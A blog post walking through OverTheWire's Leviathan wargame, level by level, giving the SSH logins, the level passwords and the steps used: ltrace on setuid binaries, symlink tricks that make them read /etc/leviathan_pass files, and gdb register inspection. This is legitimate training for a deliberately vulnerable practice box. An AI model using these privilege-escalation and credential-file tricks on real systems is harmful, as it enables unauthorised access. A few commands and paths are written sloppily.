---
draft: false
date: 2016-11-03
title: 'Guide: Over The Wire - Leviathan'
tags: ['guide', 'info-sec', 'linux']
summary: "Works with more advanced Linux concepts and privilege escalation. Walkthrough of each level of Over the Wire's Leviathan series. Its a CLI game which helps players master Linux, SSH, and much more."
---

## Level 0

```sh
ssh leviathan0@leviathan.labs.overthewire.org -p 2223
```

```sh
leviathan0
```

Find the password by searching hidden directories and
then greping for the name of the next challenge in files.

`grep leviathan1 bookmarks.html`

## Level 1

We have a bin file owned by leviathan2

```sh
ssh leviathan1@leviathan.labs.overthewire.org -p 2223
```

```sh
PPIfmI1qsA
```

`ltrace` prints the function calls which script invokes. It analyzes the program.

Afterwards we see a hardcoded output.

If we run the file again and then enter the hardcoded password
we'll see we've switched users.

Now we can check for the password inside of `/etc/leviathan_pass?leviathan2

## Level 2

```sh
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
```

```sh
mEh5PNl10e
```

Exploit a flaw in the executable.

```sh
mktemp -d
touch /tmp/tmp.POGVtTjK6O/"pass file.txt"

ltrace ./printfile /tmp/tmp.POGVtTjK6O/"pass file.txt"
```

Link file which points to

```
ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.s7E8Gz5BRw/test
```

```
chmod 777 /tmp/tmp.s7E8Gz5BRw
./printfile /tmp/tmp.s7E8Gz5BRw/"test file.txt"
```

https://www.unix.com/tips-and-tutorials/19060-unix-file-permissions.html

## Level 3

```
ssh leviathan3@leviathan.labs.overthewire.org -p 2223
```

```
Q0G8j4sakn
```

```
ltrace ./level3
```

Reading the output we see that the comparison password is hardcoded.

```
./level3
snlprintf

cat /etc/leviathan_pass/leviathan4
```

## Level 4 - Analyze file for SUID binaries

```
ssh leviathan4@leviathan.labs.overthewire.org -p 2223
```

```
AgvropI4OA
```

```
ls -al
cd .trash
./bin

echo 0100010101001011010010110110110001010100010001100011000101011000011100010111001100001010 | perl -lpe '$_=pack"B*",$_'
```

We notice `.trash` has elevated permissions so check it out.
The same thing happens for `.bin`.

The output is clearly binary so with a search we parse it to ASCII

## Level 5 -

```
ssh leviathan5@leviathan.labs.overthewire.org -p 2223
```

```
EKKlTF1Xqs
```

We notice the bin `leviathan5` fails so we create the log file for which it
complains after analyizing with ltrace.

```
touch /tmp/file.log
./leviathan5
```

```
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
./leviathan5
```

Create a link to `leviathan6` from `file.log` which executes when we run the `leviathan5` bin.

## Level 6 - Hack password in register using gdb

```
ssh leviathan6@leviathan.labs.overthewire.org -p 2223
```

```
YZ55XPVk2l
```

Debug the script at assembly level using `gdb`

```
gdb --args leviathan6 0000
```

View every assembly level instruction in the script.

```
disassemble main
```

Set a breakpoint

```
break *0x0804922a
```

Run the program

```
run
```

See what values are contained within the registers

```
info registers
```

Make the comparison like the command would and check the output

```
print $ebp-0xc
x 0xffffd4cc
print/d 0x00001bd3

7123
```

```

```

## Level 7 - Analyze file for SUID binaries

```
ssh leviathan7@leviathan.labs.overthewire.org -p 2223
```

Incredible.

```
8GpZ5f8Hze
```
